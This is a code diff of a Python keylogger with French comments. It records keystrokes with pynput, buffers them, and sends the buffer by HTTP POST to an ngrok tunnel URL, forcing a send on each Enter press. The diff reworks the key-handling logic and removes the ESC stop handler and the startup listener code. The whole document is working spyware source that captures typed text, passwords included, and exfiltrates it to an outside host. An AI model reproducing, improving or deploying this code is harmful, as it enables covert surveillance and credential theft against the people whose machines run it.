@@ -43,12 +43,12 @@ def send_log_data(data):
         response = requests.post(NGROK_URL, data={'log': data})
         
         if response.status_code == 200:
-            # SUCCÈS : Vide le buffer, le log n'est plus renvoyé par le minuteur.
+            # SUCCÈS : Vide le buffer pour éviter la répétition du log.
             log_buffer = "" 
         # Échec HTTP (code != 200) : ne vide PAS le buffer.
              
     except requests.exceptions.RequestException:
-        # Échec de la connexion (réseau coupé) : ne vide PAS le buffer.
+        # Échec de la connexion : ne vide PAS le buffer.
         pass
 
 def report():
@@ -76,41 +76,24 @@ def on_press(key):
     try:
         # Tente d'obtenir le caractère (A, b, 1, $, etc.)
         current_key = key.char
+        log_buffer += current_key
         
     except AttributeError:
         # Gère les touches spéciales
         if key == pynput.keyboard.Key.space:
-            current_key = " "
+            log_buffer += " "
+            
         elif key == pynput.keyboard.Key.enter:
-            current_key = "\n"
+            log_buffer += "\n"
+            # On force l'envoi immédiatement sur 'ENTER'
+            send_log_data(log_buffer) 
+
         elif key == pynput.keyboard.Key.backspace:
             # Gère le backspace immédiatement dans le buffer
             if len(log_buffer) > 0:
                 log_buffer = log_buffer[:-1]
-            return # Sort immédiatement
+            return # Sort immédiatement après backspace
+            
         else:
             # IGNORER : Toutes les autres touches de contrôle (CTRL, ALT, SHIFT, F1, etc.)
-            return 
-            
-    # --- LOGIQUE D'ENREGISTREMENT ---
-    if current_key:
-        log_buffer += current_key
-    
-    # Déclenche l'envoi immédiat si c'est la touche ENTRÉE
-    if current_key == "\n":
-        send_log_data(log_buffer)
-            
-def on_release(key):
-    """Permet d'arrêter le keylogger avec ESC pour les tests."""
-    if key == pynput.keyboard.Key.esc:
-        return False
-
-# --- Démarrage ---
-
-# Démarre le minuteur pour l'envoi périodique dans un thread séparé
-report() 
-
-# Crée et lance l'écouteur dans le thread principal
-with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    # Le keylogger commence à écouter
-    listener.join()
+            return
